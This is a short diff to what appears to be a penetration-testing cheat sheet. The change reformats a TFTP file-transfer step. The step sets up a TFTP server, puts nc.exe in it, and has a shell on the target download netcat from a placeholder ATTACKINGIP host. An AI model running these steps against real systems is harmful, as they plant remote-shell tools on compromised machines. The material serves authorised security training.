@@ -47,7 +47,7 @@ atftpd --daemon --port 69 /tftp
 cp /usr/share/windows-binaries/nc.exe /tftp/
 
 # In your reverse/bind shell on the target machine
-tftp -i *ATTACKINGIP* GET nc.exe
+tftp -i <i>ATTACKINGIP</i> GET nc.exe
 ```
 ### FTP File Transfer
 ```bash
